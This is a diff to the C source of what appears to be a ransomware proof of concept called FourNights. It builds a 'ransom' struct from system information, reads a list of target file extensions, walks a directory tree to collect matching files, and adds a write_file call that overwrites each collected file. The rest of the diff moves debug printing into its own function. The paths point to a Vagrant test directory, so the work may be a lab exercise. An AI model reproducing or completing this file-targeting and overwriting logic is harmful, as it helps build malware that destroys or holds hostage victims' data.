@@ -1,5 +1,31 @@
 #include "fournights.h"
 /**
+  * print_for_debug - prints elements of the struct for debugging
+  * @ransom: pointer to the ransom struct
+  */
+void print_for_debug(struct ransom_s ransom)
+{
+	int debug_int = 0;
+	char **debug_dp = NULL;
+
+	/* PRINT STRUCT FOR DEBUGGING */
+	printf("DEBUG 0: root_path: %s\n", ransom.root_path);
+	printf("DEBUG 1: os_info.sysname: %s, .nodename: %s, .release: %s, .version: %s, .machine: %s\n", ransom.os_info.sysname, ransom.os_info.nodename, ransom.os_info.release, ransom.os_info.version, ransom.os_info.machine);
+
+	printf("DEBUG 2: file extension list \n");
+	debug_dp = ransom.file_extensions;
+	for (debug_int = 0; debug_dp[debug_int] != NULL; debug_int++)
+		printf("%s%s", debug_int == 0 ? "" : ", ", debug_dp[debug_int]);
+	getchar();
+	printf("\nHas NULL at end? %s\n", debug_dp[debug_int]);
+	printf("Filebuffer: Still alive? (strtok truncates past first file ext) %s\n", ransom.file_ext_nontoken);
+	getchar();
+	printf("Number of extensions to search: %d\n", ransom.num_of_file_ext);
+	printf("DEBUG 3: \n");
+	print_list(ransom.target_files);
+}
+
+/**
   * free_ransom_struct - Frees all malloced space in the struct
   * @ransom: struct to free
  **/
@@ -88,14 +114,10 @@ node_t *recurse_ls(char *dirname, ransom_t *ransom)
  **/
 int main(int ac, char *av[])
 {
-	int debug_int = 0;
 	size_t readfile_status = 0;
-	char **debug_dp = NULL;
-
 	char *default_dir = "/home/vagrant/FourNights/TESTS/";
 	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
 	node_t *walk;
-	char *encoded_string;
 	struct ransom_s ransom;
 	struct utsname sys_info;
 
@@ -107,10 +129,8 @@ int main(int ac, char *av[])
 	ransom.target_files = NULL;
 	/* handle signals */
 	signal(SIGINT, sighandler);
-
 	/* Start building struct */
 	ransom.root_path = ac == 2 ? av[1] : default_dir;
-
 	if (uname(&sys_info) == -1)
 		perror("uname error:");
 	ransom.os_info = sys_info;
@@ -126,36 +146,15 @@ int main(int ac, char *av[])
 	{
 		printf("--------%s--------\n", walk->str);
 		read_file(walk->str, &ransom, NULL);
-		/*
-		printf("Original String: %s\n", walk->str);
-		encoded_string = base64encode(walk->str, my_strlen(walk->str));
-		printf("Base64 String: %s\n", encoded_string);
-		printf("Base64 Decoded String: %s\n", base64decode(encoded_string, my_strlen(encoded_string)));
-		*/
+		write_file(walk, "lala");
 		walk = walk->next;
+		getchar();
 	}
-	getchar();
-	encoded_string = NULL;
-	encoded_string++;
+	/* print struct for debugging*/
+	/*
+	print_for_debug(ransom);
+	*/
 
-
-	/* PRINT STRUCT FOR DEBUGGING */
-	printf("DEBUG 0: root_path: %s\n", ransom.root_path);
-	printf("DEBUG 1: os_info.sysname: %s, .nodename: %s, .release: %s, .version: %s, .machine: %s\n", ransom.os_info.sysname, ransom.os_info.nodename, ransom.os_info.release, ransom.os_info.version, ransom.os_info.machine);
-
-	printf("DEBUG 2: file extension list \n");
-	debug_dp = ransom.file_extensions;
-	for (debug_int = 0; debug_dp[debug_int] != NULL; debug_int++)
-		printf("%s%s", debug_int == 0 ? "" : ", ", debug_dp[debug_int]);
-	getchar();
-	printf("\nHas NULL at end? %s\n", debug_dp[debug_int]);
-	printf("Filebuffer: Still alive? (strtok truncates past first file ext) %s\n", ransom.file_ext_nontoken);
-	getchar();
-	printf("Number of extensions to search: %d\n", ransom.num_of_file_ext);
-	printf("DEBUG 3: \n");
-	print_list(ransom.target_files);
-
-	getchar();
 
 	/* Free */
 	free_ransom_struct(&ransom);
